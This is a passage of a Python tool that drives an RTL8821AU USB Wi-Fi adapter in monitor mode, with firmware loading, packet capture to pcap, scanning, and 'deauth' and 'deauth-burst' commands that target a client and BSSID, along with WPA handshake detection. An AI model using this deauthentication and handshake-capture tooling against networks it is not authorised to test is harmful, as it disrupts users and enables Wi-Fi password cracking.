        return 5000 + ch * 5
    if 182 <= ch <= 196:
        return 4000 + ch * 5
    return 0

def _radiotap_header(tsft: int, channel: int, flags: Optional[int]) -> bytes:
    has_flags = flags is not None
    present = 0x0000000B if has_flags else 0x00000009
    freq = _chan_to_freq_mhz(channel)
    if 1 <= channel <= 14:
        chan_flags = 0x0080
    elif (36 <= channel <= 177) or (182 <= channel <= 196):
        chan_flags = 0x0100
    else:
        chan_flags = 0x0000

    hdr = bytearray()
    hdr += struct.pack("<BBH", 0, 0, 0)
    hdr += struct.pack("<I", present)
    hdr += struct.pack("<Q", tsft & 0xFFFFFFFFFFFFFFFF)
    if has_flags:
        hdr += struct.pack("<B", int(flags))
        hdr += b"\x00"
    hdr += struct.pack("<HH", freq, chan_flags)
    struct.pack_into("<H", hdr, 2, len(hdr))
    return bytes(hdr)

def _fc_version(payload: bytes) -> int:
    if len(payload) < 2:
        return 3
    fc = int.from_bytes(payload[0:2], "little")
    return fc & 0x3

def _crc32_80211(data: bytes) -> int:
    return zlib.crc32(data) & 0xFFFFFFFF

def _strip_fcs_if_present(payload: bytes) -> tuple[bytes, bool]:
    if len(payload) < 4:
        return payload, False
    fcs_le = int.from_bytes(payload[-4:], "little")
    calc = _crc32_80211(payload[:-4])
    if fcs_le == calc:
        return payload[:-4], True
    return payload, False

class PcapWriter:
    def __init__(self, fp, linktype: int = 127, snaplen: int = 65535) -> None:
        self.fp = fp
        self.linktype = linktype
        self.snaplen = snaplen
        self._write_global_header()

    def _write_global_header(self) -> None:
        self.fp.write(struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, self.snaplen, self.linktype))
        self.fp.flush()

    def write_packet(self, payload: bytes) -> None:
        now = time.time()
        ts_sec = int(now)
        ts_usec = int((now - ts_sec) * 1_000_000)
        incl = len(payload)
        self.fp.write(struct.pack("<IIII", ts_sec, ts_usec, incl, incl))
        self.fp.write(payload)

    def flush(self) -> None:
        self.fp.flush()

def _parse_addrs(payload: bytes) -> tuple[Optional[bytes], Optional[bytes], Optional[bytes], Optional[bytes], int, int, int]:
    if len(payload) < 2:
        return None, None, None, None, 0, 0, 0
    fc = int.from_bytes(payload[0:2], "little")
    ftype = (fc >> 2) & 0x3
    subtype = (fc >> 4) & 0xF
    to_ds = bool((fc >> 8) & 0x1)
    from_ds = bool((fc >> 9) & 0x1)

    if len(payload) < 24:
        return None, None, None, None, ftype, subtype, 0

    a1 = payload[4:10]
    a2 = payload[10:16]
    a3 = payload[16:22]
    seq = int.from_bytes(payload[22:24], "little")

    if ftype == 0:
        return a1, a2, a3, None, ftype, subtype, seq

    if ftype == 2:
        a4 = payload[24:30] if (to_ds and from_ds and len(payload) >= 30) else None
        return a1, a2, a3, a4, ftype, subtype, seq

    return a1, a2, a3, None, ftype, subtype, seq

def _detect_4way_eapol(payload: bytes) -> Optional[tuple[int, Optional[bytes], Optional[bytes], int, int]]:
    if len(payload) < 32:
        return None
    fc = int.from_bytes(payload[0:2], "little")
    ftype = (fc >> 2) & 0x3
    if ftype != 2:
        return None

    subtype = (fc >> 4) & 0xF
    to_ds = bool((fc >> 8) & 0x1)
    from_ds = bool((fc >> 9) & 0x1)
    order = bool((fc >> 15) & 0x1)

    hdr_len = 24
    if to_ds and from_ds:
        hdr_len += 6
    if subtype & 0x8:
        hdr_len += 2
    if order:
        hdr_len += 4
    if len(payload) < hdr_len + 8 + 4 + 1 + 2 + 8:
        return None

    llc = payload[hdr_len : hdr_len + 8]
    if llc != b"\xaa\xaa\x03\x00\x00\x00\x88\x8e":
        return None

    eapol_off = hdr_len + 8
    eapol_type = payload[eapol_off + 1]
    if eapol_type != 3:
        return None

    eapol_len = int.from_bytes(payload[eapol_off + 2 : eapol_off + 4], "big")
    if len(payload) < eapol_off + 4 + eapol_len:
        return None
    if eapol_len < 1 + 2 + 8:
        return None

    key_desc_type = payload[eapol_off + 4]
    if key_desc_type not in (2,):
        return None

    key_info = int.from_bytes(payload[eapol_off + 5 : eapol_off + 7], "big")
    replay = int.from_bytes(payload[eapol_off + 9 : eapol_off + 17], "big")

    key_type = bool(key_info & 0x0008)
    install = bool(key_info & 0x0010)
    ack = bool(key_info & 0x0020)
    mic = bool(key_info & 0x0040)
    secure = bool(key_info & 0x0080)

    if not key_type:
        return None

    msg: Optional[int] = None
    if ack and not mic:
        msg = 1
    elif (not ack) and mic and (not secure):
        msg = 2
    elif ack and mic and install:
        msg = 3
    elif (not ack) and mic and secure:
        msg = 4

    if msg is None:
        return None

    a1, a2, a3, _a4, _ftype2, _subtype2, _seq = _parse_addrs(payload)

    bssid: Optional[bytes] = None
    sta: Optional[bytes] = None
    if not from_ds and to_ds:
        bssid = a1
        sta = a2
    elif from_ds and not to_ds:
        bssid = a2
        sta = a1

    return msg, bssid, sta, replay, key_info

def _print_4way_if_present(payload: bytes) -> None:
    info = _detect_4way_eapol(payload)
    if info is None:
        return
    msg, bssid, sta, replay, key_info = info
    bssid_s = _fmt_mac(bssid) if bssid is not None else "??"
    sta_s = _fmt_mac(sta) if sta is not None else "??"
    sys.stderr.write(f"4wh msg{msg} bssid={bssid_s} sta={sta_s} replay={replay} key_info=0x{key_info:04x}\n")
    sys.stderr.flush()

def _extract_mgmt_ssid_and_channel(payload: bytes) -> tuple[Optional[str], Optional[int]]:
    def _inner(p: bytes) -> tuple[Optional[str], Optional[int]]:
        if len(p) < 24:
            return None, None
        fc = int.from_bytes(p[0:2], "little")
        ftype = (fc >> 2) & 0x3
        subtype = (fc >> 4) & 0xF
        if ftype != 0 or subtype not in (5, 8):
            return None, None

        fixed_len = 12
        ies_off = 24 + fixed_len
        if len(p) < ies_off:
            return None, None
        ies = p[ies_off:]

        ssid: Optional[str] = None
        channel: Optional[int] = None
        off = 0
        while off + 2 <= len(ies):
            eid = ies[off]
            elen = ies[off + 1]
            off += 2
            if off + elen > len(ies):
                break
            data = ies[off : off + elen]
            off += elen

            if eid == 0:
                if elen == 0:
                    ssid = ""
                else:
                    ssid = data.decode("utf-8", errors="replace")
            elif eid == 3 and elen == 1:
                ch = data[0]
                if 1 <= ch <= 165:
                    channel = int(ch)
        return ssid, channel

    ssid, ch = _inner(payload)
    if ssid is not None:
        return ssid, ch
    if len(payload) >= 28:
        return _inner(payload[:-4])
    return None, None


def main(argv: list[str]) -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--vid", type=_parse_int, default=0x2357)
    ap.add_argument("--pid", type=_parse_int, default=0x0120)
    ap.add_argument("--interface", type=int, default=0)
    ap.add_argument("--configuration", type=int, default=1)

    sub = ap.add_subparsers(dest="cmd", required=True)

    p_info = sub.add_parser("info")

    p_r = sub.add_parser("read")
    p_r.add_argument("addr", type=_parse_int)
    p_r.add_argument("len", type=int, choices=(1, 2, 4))

    p_w = sub.add_parser("write")
    p_w.add_argument("addr", type=_parse_int)
    p_w.add_argument("value", type=_parse_int)
    p_w.add_argument("len", type=int, choices=(1, 2, 4))

    p_fw = sub.add_parser("fw")
    p_fw.add_argument("--path", required=True)
    p_fw.add_argument("--debug", action="store_true")
    p_fw.add_argument("--retries", type=int, default=3)
    p_fw.add_argument("--no-power-on", action="store_true")

    p_up = sub.add_parser("up")
    p_up.add_argument("--path", required=True)
    p_up.add_argument("--debug", action="store_true")
    p_up.add_argument("--retries", type=int, default=3)
    p_up.add_argument("--no-power-on", action="store_true")

    p_rx = sub.add_parser("rx")
    p_rx.add_argument("--ep-in", type=_parse_int, default=None)
    p_rx.add_argument("--size", type=int, default=16384)
    p_rx.add_argument("--timeout-ms", type=int, default=1000)
    p_rx.add_argument("--fw-path", default=None)
    p_rx.add_argument("--fw-debug", action="store_true")
    p_rx.add_argument("--fw-retries", type=int, default=3)
    p_rx.add_argument("--no-power-on", action="store_true")
    p_rx.add_argument("--init-mac", action="store_true")
    p_rx.add_argument("--channel", type=int, default=1)
    p_rx.add_argument("--bw", type=int, choices=(20, 40, 80), default=20)
    p_rx.add_argument("--limit", type=int, default=0)
    p_rx.add_argument("--max-reads", type=int, default=0)
    p_rx.add_argument("--max-seconds", type=float, default=0.0)
    p_rx.add_argument("--debug", action="store_true")
    p_rx.add_argument("--auto-alt", action="store_true")
    p_rx.add_argument("--replay-pcap", default="mon-mode.pcap")
    p_rx.add_argument("--replay-filter", default=None)
    p_rx.add_argument("--replay-mode", choices=("vendor", "all"), default="all")
    p_rx.add_argument("--replay-only", action="store_true")
    p_rx.add_argument("--replay-sleep", action="store_true")
    p_rx.add_argument("--replay-max-sleep-ms", type=int, default=5)
    p_rx.add_argument("--replay-timeout-ms", type=int, default=1000)
    p_rx.add_argument("--replay-bulk-in-default-size", type=int, default=32768)
    p_rx.add_argument("--replay-limit", type=int, default=0)
    p_rx.add_argument("--replay-no-verify-in", action="store_true")
    p_rx.add_argument("--replay-verify-in-len", action="store_true")
    p_rx.add_argument("--replay-only-rtw-vendor-req", action="store_true")
    p_rx.add_argument("--replay-report-mismatch", type=int, default=0)
    p_rx.add_argument("--replay-report-errors", type=int, default=0)
    p_rx.add_argument("--replay-verify-delay-ms", type=float, default=0.0)
    p_rx.add_argument("--pcap", default="")
    p_rx.add_argument("--pcap-include-bad-fcs", action="store_true")
    p_rx.add_argument("--pcap-with-fcs", action="store_true")

    p_scan = sub.add_parser("scan")
    p_scan.add_argument("--fw-path", default=None)
    p_scan.add_argument("--fw-debug", action="store_true")
    p_scan.add_argument("--fw-retries", type=int, default=3)
    p_scan.add_argument("--no-power-on", action="store_true")
    p_scan.add_argument("--channels", default="1-13,36-64,100-140,149-165")
    p_scan.add_argument("--bw", type=int, choices=(20, 40, 80), default=20)
    p_scan.add_argument("--dwell-ms", type=int, default=1000)
    p_scan.add_argument("--ep-in", type=_parse_int, default=None)
    p_scan.add_argument("--size", type=int, default=32768)
    p_scan.add_argument("--timeout-ms", type=int, default=1200)
    p_scan.add_argument("--target-ssid", default="")
    p_scan.add_argument("--scan-include-bad-fcs", action="store_true")
    p_scan.add_argument("--station-scan-ms", type=int, default=5000)
    p_scan.add_argument("--replay-pcap", default="mon-mode.pcap")
    p_scan.add_argument("--replay-filter", default=None)
    p_scan.add_argument("--replay-mode", choices=("vendor", "all"), default="all")
    p_scan.add_argument("--replay-only", action="store_true")
    p_scan.add_argument("--replay-sleep", action="store_true")
    p_scan.add_argument("--replay-max-sleep-ms", type=int, default=5)
    p_scan.add_argument("--replay-timeout-ms", type=int, default=1000)
    p_scan.add_argument("--replay-bulk-in-default-size", type=int, default=32768)
    p_scan.add_argument("--replay-limit", type=int, default=0)
    p_scan.add_argument("--replay-no-verify-in", action="store_true")
    p_scan.add_argument("--replay-verify-in-len", action="store_true")
    p_scan.add_argument("--replay-only-rtw-vendor-req", action="store_true")
    p_scan.add_argument("--replay-report-mismatch", type=int, default=0)
    p_scan.add_argument("--replay-report-errors", type=int, default=0)
    p_scan.add_argument("--no-sitesurvey-filters", action="store_true")
    p_scan.add_argument("--scan-dump", type=int, default=0)
    p_scan.add_argument("--debug", action="store_true")

    p_tx = sub.add_parser("tx")
    p_tx.add_argument("--ep-out", type=_parse_int, default=None)
    p_tx.add_argument("--fw-path", default=None)
    p_tx.add_argument("--fw-debug", action="store_true")
    p_tx.add_argument("--fw-retries", type=int, default=3)
    p_tx.add_argument("--no-power-on", action="store_true")
    p_tx.add_argument("--init-mac", action="store_true")
    p_tx.add_argument("--channel", type=int, default=1)
    p_tx.add_argument("--bw", type=int, choices=(20, 40, 80), default=20)
    p_tx.add_argument("hexframe")

    p_deauth = sub.add_parser("deauth")
    p_deauth.add_argument("--ep-out", type=_parse_int, default=None)
    p_deauth.add_argument("--fw-path", default=None)
    p_deauth.add_argument("--fw-debug", action="store_true")
    p_deauth.add_argument("--fw-retries", type=int, default=3)
    p_deauth.add_argument("--no-power-on", action="store_true")
    p_deauth.add_argument("--init-mac", action="store_true")
    p_deauth.add_argument("--channel", type=int, default=1)
    p_deauth.add_argument("--bw", type=int, choices=(20, 40, 80), default=20)
    p_deauth.add_argument("--target-mac", required=True)
    p_deauth.add_argument("--bssid", required=True)
    p_deauth.add_argument("--source-mac", default=None)
    p_deauth.add_argument("--reason", type=int, default=7)
    p_deauth.add_argument("--count", type=int, default=1)
    p_deauth.add_argument("--delay-ms", type=int, default=100)

    p_deauth_burst = sub.add_parser("deauth-burst")
    p_deauth_burst.add_argument("--ep-in", type=_parse_int, default=None)
    p_deauth_burst.add_argument("--ep-out", type=_parse_int, default=None)
    p_deauth_burst.add_argument("--fw-path", default=None)
    p_deauth_burst.add_argument("--fw-debug", action="store_true")
    p_deauth_burst.add_argument("--fw-retries", type=int, default=3)
    p_deauth_burst.add_argument("--no-power-on", action="store_true")
    p_deauth_burst.add_argument("--init-mac", action="store_true")
    p_deauth_burst.add_argument("--channel", type=int, default=1)
    p_deauth_burst.add_argument("--bw", type=int, choices=(20, 40, 80), default=20)
    p_deauth_burst.add_argument("--target-mac", required=True)
    p_deauth_burst.add_argument("--bssid", required=True)
    p_deauth_burst.add_argument("--source-mac", default=None)
    p_deauth_burst.add_argument("--reason", type=int, default=7)
    p_deauth_burst.add_argument("--pcap", required=True)
    p_deauth_burst.add_argument("--pcap-include-bad-fcs", action="store_true")
    p_deauth_burst.add_argument("--pcap-with-fcs", action="store_true")
    p_deauth_burst.add_argument("--replay-pcap", default="mon-mode.pcap")
    p_deauth_burst.add_argument("--replay-filter", default=None)
    p_deauth_burst.add_argument("--replay-mode", choices=("vendor", "all"), default="all")
    p_deauth_burst.add_argument("--replay-sleep", action="store_true")
    p_deauth_burst.add_argument("--replay-max-sleep-ms", type=int, default=5)
    p_deauth_burst.add_argument("--replay-timeout-ms", type=int, default=1000)
    p_deauth_burst.add_argument("--replay-bulk-in-default-size", type=int, default=32768)
    p_deauth_burst.add_argument("--replay-only-rtw-vendor-req", action="store_true")
    p_deauth_burst.add_argument("--replay-report-mismatch", type=int, default=0)
    p_deauth_burst.add_argument("--replay-report-errors", type=int, default=0)
    p_deauth_burst.add_argument("--replay-no-verify-in", action="store_true")
    p_deauth_burst.add_argument("--replay-verify-in-len", action="store_true")
    p_deauth_burst.add_argument("--burst-size", type=int, default=10)
    p_deauth_burst.add_argument("--burst-interval-ms", type=int, default=1000)
    p_deauth_burst.add_argument("--burst-duration-s", type=float, default=0.0)
    p_deauth_burst.add_argument("--burst-read-timeout-ms", type=int, default=50)
    p_deauth_burst.add_argument("--read-size", type=int, default=32768)

    p_led = sub.add_parser("led")
    p_led.add_argument("--fw-path", default=None)
    p_led.add_argument("--fw-debug", action="store_true")
    p_led.add_argument("--fw-retries", type=int, default=3)
    p_led.add_argument("--no-power-on", action="store_true")
    p_led.add_argument("--init-mac", action="store_true")
    p_led.add_argument("--count", type=int, default=10)
    p_led.add_argument("--on-ms", type=int, default=150)
    p_led.add_argument("--off-ms", type=int, default=150)
    p_led.add_argument("--reg", type=_parse_int, default=REG_LEDCFG2)

    p_replay = sub.add_parser("replay")
    p_replay.add_argument("--pcap", required=True)
    p_replay.add_argument("--filter", default="usb.urb_type=='S' || usb.urb_type=='C'")
    p_replay.add_argument("--timeout-ms", type=int, default=1000)
    p_replay.add_argument("--bulk-in-default-size", type=int, default=32768)
    p_replay.add_argument("--sleep", action="store_true")
    p_replay.add_argument("--max-sleep-ms", type=int, default=5)
    p_replay.add_argument("--dry-run", action="store_true")
    p_replay.add_argument("--limit", type=int, default=0)
    p_replay.add_argument("--no-verify-in", action="store_true")
    p_replay.add_argument("--verify-in-len", action="store_true")
    p_replay.add_argument("--only-rtw-vendor-req", action="store_true")
    p_replay.add_argument("--report-mismatch", type=int, default=0)
    p_replay.add_argument("--report-errors", type=int, default=0)
    p_replay.add_argument("--debug", action="store_true")

    args = ap.parse_args(argv)
    dev = Rtl8821auUsb(vid=args.vid, pid=args.pid)
    if args.cmd != "replay" or not getattr(args, "dry_run", False):
        dev.open(interface=args.interface, configuration=args.configuration)

    try:
        def _autodetect_fw_path() -> Optional[Path]:
            candidates = [
                Path("/lib/firmware/rtlwifi/rtl8821aufw.bin"),
                Path("/usr/lib/firmware/rtlwifi/rtl8821aufw.bin"),
                Path(__file__).resolve().parent / "rtl8821aufw.bin",
                Path(__file__).resolve().parent / "firmware" / "rtl8821aufw.bin",
                Path(__file__).resolve().parent / "rtlwifi" / "rtl8821aufw.bin",
            ]
            for p in candidates:
                try:
                    if p.is_file():
                        return p
                except Exception:
                    continue
            return None

        def _resolve_replay_pcap(p: Optional[str]) -> Optional[str]:
            if p is None:
                return None
            ps = str(p).strip()
            if not ps:
                return None
            p0 = Path(ps)
            try:
                if p0.is_file():
                    return str(p0)
            except Exception:
                pass
            if ("/" not in ps) and ("\\" not in ps):
                p1 = Path(__file__).resolve().parent / "firmware" / ps
                try:
                    if p1.is_file():
                        return str(p1)
                except Exception:
                    pass
            return ps

        if args.cmd == "info":
            print(f"Device: {args.vid:04x}:{args.pid:04x}")
            print(f"Interface: {args.interface}")
            print("Bulk IN endpoints:", ", ".join(f"0x{e.bEndpointAddress:02x}" for e in dev.bulk_in_eps))
            print("Bulk OUT endpoints:", ", ".join(f"0x{e.bEndpointAddress:02x}" for e in dev.bulk_out_eps))
            print(f"REG_MCUFWDL: 0x{dev.read32(REG_MCUFWDL):08x}")
            return 0

        if args.cmd == "read":
            if args.len == 1:
                v = dev.read8(args.addr)
            elif args.len == 2:
                v = dev.read16(args.addr)
            else:
                v = dev.read32(args.addr)
            print(f"0x{v:0{args.len*2}x}")
            return 0

        if args.cmd == "write":
            if args.len == 1:
                dev.write8(args.addr, args.value)
            elif args.len == 2:
                dev.write16(args.addr, args.value)
            else:
                dev.write32(args.addr, args.value)
            return 0

        if args.cmd == "fw":
            with open(args.path, "rb") as f:
                fw_bytes = f.read()
            if not args.no_power_on:
                dev.power_on_8821a_usb(debug=args.debug)
            dev.download_firmware(fw_bytes, debug=args.debug, retries=args.retries)
            print("OK")
            return 0

        if args.cmd == "up":
            with open(args.path, "rb") as f:
                fw_bytes = f.read()
            if not args.no_power_on:
                dev.power_on_8821a_usb(debug=args.debug)
            dev.download_firmware(fw_bytes, debug=args.debug, retries=args.retries)
            dev.hw_init_8821au()
            print("OK")
            return 0

        if args.cmd == "rx":
            replay_pcap = _resolve_replay_pcap(getattr(args, "replay_pcap", None))
            if replay_pcap is None:
                fw_path: Optional[Path] = Path(args.fw_path) if args.fw_path is not None else None
                if fw_path is None and not args.init_mac:
                    fw_path = _autodetect_fw_path()

                if fw_path is not None:
                    with open(fw_path, "rb") as f:
                        fw_bytes = f.read()
                    if not args.no_power_on:
                        dev.power_on_8821a_usb(debug=args.fw_debug)
                    dev.download_firmware(fw_bytes, debug=args.fw_debug, retries=args.fw_retries)
                    dev.hw_init_8821au()
                elif args.init_mac:
                    dev.init_mac_rx_tx()
            elif args.init_mac:
                dev.init_mac_rx_tx()

            if replay_pcap is not None:
                if args.replay_mode == "all":
                    default_filter = "usb.urb_type=='S' || usb.urb_type=='C'"
                    display_filter = args.replay_filter or default_filter
                    stats = dev.replay_all_usb_requests_from_pcap(
                        replay_pcap,
                        display_filter=display_filter,
                        timeout_ms=args.replay_timeout_ms,
                        bulk_in_default_size=args.replay_bulk_in_default_size,
                        sleep=args.replay_sleep,
                        max_sleep_ms=args.replay_max_sleep_ms,
                        dry_run=False,
                        limit=int(args.replay_limit),
                        debug=args.debug,
                        verify_in=not args.replay_no_verify_in,
                        verify_in_mode=("len" if args.replay_verify_in_len else "bytes"),
                        only_rtw_vendor_req=bool(args.replay_only_rtw_vendor_req),
                        report_mismatch=int(args.replay_report_mismatch),
                        report_errors=int(args.replay_report_errors),
                    )
                    if args.debug:
                        print(f"[replay] stats={stats}")
                else:
                    default_filter = "usb.urb_type=='S' && (usb.bmRequestType==0x40 || usb.bmRequestType==0xc0) && usb.setup.bRequest==5"
                    display_filter = args.replay_filter or default_filter
                    replayed = dev.replay_vendor_requests_from_pcap(
                        replay_pcap,
                        display_filter=display_filter,
                        debug=args.debug,
                        sleep=args.replay_sleep,
                        max_sleep_ms=args.replay_max_sleep_ms,
                        verify_delay_ms=args.replay_verify_delay_ms,
                    )
                    if args.debug:
                        print(f"[replay] requests={replayed}")
                dev.set_monitor_mode()
                dev.enable_mac_tx_rx()
                dev._init_burst_pkt_len_8821u()

            dev.set_channel(args.channel, bandwidth_mhz=args.bw)

            seen = 0
            reads = 0
            t0 = time.monotonic()
            tried_eps = False

            if args.auto_alt:
                try:
                    dev.autoselect_rx_altsetting(read_size=min(args.size, 4096), timeout_ms=200, trials=2)
                except usb.core.USBError:
                    pass

            if args.debug:
                in_eps = ", ".join(f"0x{e.bEndpointAddress:02x}" for e in dev.bulk_in_eps)
                out_eps = ", ".join(f"0x{e.bEndpointAddress:02x}" for e in dev.bulk_out_eps)
                print(f"[rx] interface={args.interface} alt={dev.altsetting}")
                print(f"[rx] bulk IN: {in_eps}")
                print(f"[rx] bulk OUT: {out_eps}")

            def _dump_regs() -> None:
                regs8 = [
                    ("SYS_FUNC_EN", REG_SYS_FUNC_EN, 1),
                    ("SYS_FUNC_EN+1", REG_SYS_FUNC_EN + 1, 1),
                    ("MSR", REG_MSR, 1),
                    ("RSV_CTRL", REG_RSV_CTRL, 1),
                    ("RF_CTRL", REG_RF_CTRL, 1),
                    ("TXPAUSE", REG_TXPAUSE, 1),
                    ("RX_DRVINFO_SZ", REG_RX_DRVINFO_SZ, 1),
                    ("USB_SPECIAL_OPTION", REG_USB_SPECIAL_OPTION, 1),
                    ("REG_05A7", REG_05A7, 1),
                    ("REG_0F050", REG_0F050, 1),
                    ("REG_0289", 0x0289, 1),
                    ("PIFS", REG_PIFS, 1),
                ]
                regs16 = [
                    ("CR16", REG_CR, 2),
                    ("TRXDMA_CTRL16", REG_TRXDMA_CTRL, 2),
                    ("RXDMA_AGG_PG_TH", REG_RXDMA_AGG_PG_TH, 2),
                    ("RXDMA_STATUS", REG_RXDMA_STATUS, 2),
                    ("RXDMA_PRO_8812", REG_RXDMA_PRO_8812, 2),
                    ("MAX_AGGR_NUM", REG_MAX_AGGR_NUM, 2),
                    ("RXFLTMAP0", REG_RXFLTMAP0, 2),
                    ("RXFLTMAP1", REG_RXFLTMAP1, 2),
                    ("RXFLTMAP2", REG_RXFLTMAP2, 2),
                ]
                regs32 = [
                    ("MCUFWDL", REG_MCUFWDL, 4),
                    ("SYS_CFG", REG_SYS_CFG, 4),
                    ("CR32", REG_CR, 4),
                    ("RCR", REG_RCR, 4),
                    ("OFDM0_TRX_PATH_ENABLE", REG_OFDM0_TRX_PATH_ENABLE, 4),
                    ("MACID", REG_MACID, 4),
                    ("RFPGA0_RFMOD", RFPGA0_RFMOD, 4),
                    ("rRxPath_Jaguar", rRxPath_Jaguar, 4),
                    ("rTxPath_Jaguar", rTxPath_Jaguar, 4),
                    ("rCCK_RX_Jaguar", rCCK_RX_Jaguar, 4),
                    ("FAST_EDCA_CTRL", REG_FAST_EDCA_CTRL, 4),
                ]

                print("[rx] reg dump:")
                for name, addr, _ in regs8:
                    try:
                        v = dev.read8(addr)
                        print(f"[rx]   {name} (0x{addr:04x}) = 0x{v:02x}")
                    except usb.core.USBError as e:
                        print(f"[rx]   {name} (0x{addr:04x}) = <usb error: {e}>")
                for name, addr, _ in regs16:
                    try:
                        v = dev.read16(addr)
                        print(f"[rx]   {name} (0x{addr:04x}) = 0x{v:04x}")
                    except usb.core.USBError as e:
                        print(f"[rx]   {name} (0x{addr:04x}) = <usb error: {e}>")
                for name, addr, _ in regs32:
                    try:
                        v = dev.read32(addr)
                        print(f"[rx]   {name} (0x{addr:04x}) = 0x{v:08x}")
                    except usb.core.USBError as e:
                        print(f"[rx]   {name} (0x{addr:04x}) = <usb error: {e}>")

            def _rx_exit(code: int) -> int:
                nonlocal tried_eps
                if (
                    code != 0
                    and args.debug
                    and not tried_eps
                    and args.ep_in is None
                    and len(dev.bulk_in_eps) > 1
                ):
                    tried_eps = True
                    print("[rx] no packets; probing all bulk IN endpoints...")
                    for ep in dev.bulk_in_eps:
                        ep_addr = int(ep.bEndpointAddress)
                        got = 0
                        for _ in range(2):
                            raw2 = dev.bulk_read(ep_addr=ep_addr, size=args.size, timeout_ms=200)
                            if raw2:
                                got += 1
                        print(f"[rx] ep=0x{ep_addr:02x} trials=2 got={got}")
                if code != 0 and args.debug:
                    _dump_regs()
                return code
            fp = None
            pcap = None
            if args.pcap:
                fp = sys.stdout.buffer if args.pcap == "-" else open(args.pcap, "wb")
                pcap = PcapWriter(fp)
            try:
                while True:
                    raw = dev.bulk_read(ep_addr=args.ep_in, size=args.size, timeout_ms=args.timeout_ms)
                    reads += 1
                    if args.max_reads and reads >= args.max_reads:
                        if args.debug:
                            print(f"[rx] max-reads reached, seen={seen} reads={reads}")
                        return _rx_exit(1 if seen == 0 else 0)
                    if args.max_seconds and (time.monotonic() - t0) >= args.max_seconds:
                        if args.debug:
                            print(f"[rx] max-seconds reached, seen={seen} reads={reads}")
                        return _rx_exit(1 if seen == 0 else 0)
                    if not raw:
                        continue
                    if args.debug:
                        print(f"[rx] urb len={len(raw)}")
                    for pkt in parse_rx_agg(raw):
                        frame = pkt.frame
                        if pcap is not None:
                            if not args.pcap_include_bad_fcs and (pkt.crc_err or pkt.icv_err):
                                continue
                            if _fc_version(frame) != 0:
                                continue
                            if len(frame) < 2:
                                continue
                            fc = int.from_bytes(frame[0:2], "little")
                            ftype = (fc >> 2) & 0x3
                            subtype = (fc >> 4) & 0xF
                            if ftype == 3:
                                continue
                            if ftype == 1:
                                if subtype not in (7, 8, 9, 10, 11, 12, 13, 14, 15):
                                    continue
                                min_ctrl_len = 10 if subtype in (12, 13) else 16
                                if len(frame) < min_ctrl_len:
                                    continue
                                if len(frame) > 512:
                                    continue
                            else:
                                if len(frame) < 24:
                                    continue

                            flags: Optional[int] = None
                            if args.pcap_with_fcs:
                                flags_val = 0x10
                                if pkt.crc_err:
                                    flags_val |= 0x40
                                flags = flags_val
                            else:
                                frame, _ = _strip_fcs_if_present(frame)

                            tsft = int(time.time() * 1_000_000)
                            rtap = _radiotap_header(tsft=tsft, channel=int(args.channel), flags=flags)
                            pcap.write_packet(rtap + frame)
                            seen += 1
                            if args.limit and seen >= args.limit:
                                return 0
                        else:
                            if pkt.crc_err or pkt.icv_err:
                                continue
                            head = frame[:32]
                            print(
                                "RX"
                                f" len={pkt.pkt_len}"
                                f" macid={pkt.macid}"
                                f" tid={pkt.tid}"
                                f" seq={pkt.seq}"
                                f" frag={pkt.frag}"
                                f" rate=0x{pkt.rx_rate:02x}"
                                f" qos={1 if pkt.is_qos else 0}"
                                f" physt={1 if pkt.physt else 0}"
                                f" head={head.hex()}"
                            )
                            seen += 1
                            if args.limit and seen >= args.limit:
                                return 0
            except KeyboardInterrupt:
                if args.debug:
                    print(f"[rx] interrupted, seen={seen} reads={reads}")
                return _rx_exit(1 if seen == 0 else 0)
            finally:
                if pcap is not None:
                    try:
                        pcap.flush()
                    except Exception:
                        pass
                if fp is not None and args.pcap != "-":
                    try:
                        fp.close()
                    except Exception:
                        pass

        if args.cmd == "scan":
            replay_pcap = _resolve_replay_pcap(getattr(args, "replay_pcap", None))
            if replay_pcap is None:
                fw_path: Optional[Path] = Path(args.fw_path) if args.fw_path is not None else None
                if fw_path is None:
                    fw_path = _autodetect_fw_path()
                if fw_path is None:
                    raise RuntimeError("firmware path not set (use --fw-path or install rtl8821aufw.bin)")
                with open(fw_path, "rb") as f:
                    fw_bytes = f.read()
                if not args.no_power_on:
                    dev.power_on_8821a_usb(debug=args.fw_debug)
                dev.download_firmware(fw_bytes, debug=args.fw_debug, retries=args.fw_retries)
                dev.hw_init_8821au()

            if replay_pcap is not None:
                if args.replay_mode == "all":
                    default_filter = "usb.urb_type=='S' || usb.urb_type=='C'"
                    display_filter = args.replay_filter or default_filter
                    stats = dev.replay_all_usb_requests_from_pcap(
                        replay_pcap,
                        display_filter=display_filter,
                        timeout_ms=args.replay_timeout_ms,
                        bulk_in_default_size=args.replay_bulk_in_default_size,
                        sleep=args.replay_sleep,
                        max_sleep_ms=args.replay_max_sleep_ms,
                        dry_run=False,
                        limit=int(args.replay_limit),
                        debug=args.debug,
                        verify_in=not args.replay_no_verify_in,
                        verify_in_mode=("len" if args.replay_verify_in_len else "bytes"),
                        only_rtw_vendor_req=bool(args.replay_only_rtw_vendor_req),
                        report_mismatch=int(args.replay_report_mismatch),
                        report_errors=int(args.replay_report_errors),
                    )
                    if args.debug:
                        print(f"[replay] stats={stats}")
                else:
                    default_filter = "usb.urb_type=='S' && (usb.bmRequestType==0x40 || usb.bmRequestType==0xc0) && usb.setup.bRequest==5"
                    display_filter = args.replay_filter or default_filter
                    replayed = dev.replay_vendor_requests_from_pcap(
                        replay_pcap,
                        display_filter=display_filter,
                        debug=args.debug,
                        sleep=args.replay_sleep,
                        max_sleep_ms=args.replay_max_sleep_ms,
                        verify_delay_ms=0.0,
                    )
                    if args.debug:
                        print(f"[replay] requests={replayed}")
                dev.set_monitor_mode()
                dev.enable_mac_tx_rx()
                dev._init_burst_pkt_len_8821u()
                if not args.no_sitesurvey_filters:
                    dev.set_sitesurvey_filters(True)
            elif not args.no_sitesurvey_filters:
                dev.set_sitesurvey_filters(True)

            channels = _parse_channels(args.channels)
            if not channels:
                channels = list(range(1, 14)) + list(range(36, 65)) + list(range(100, 141)) + list(range(149, 166))
            channels_set = set(int(c) for c in channels)

            if args.debug:
                in_eps = ", ".join(f"0x{e.bEndpointAddress:02x}" for e in dev.bulk_in_eps)
                print(f"[scan] bulk IN: {in_eps}")
                print(f"[scan] size={args.size} timeout_ms={args.timeout_ms} dwell_ms={args.dwell_ms}")
                try:
                    cr16 = dev.read16(REG_CR)
                    cr32 = dev.read32(REG_CR)
                    trxdma = dev.read16(REG_TRXDMA_CTRL)
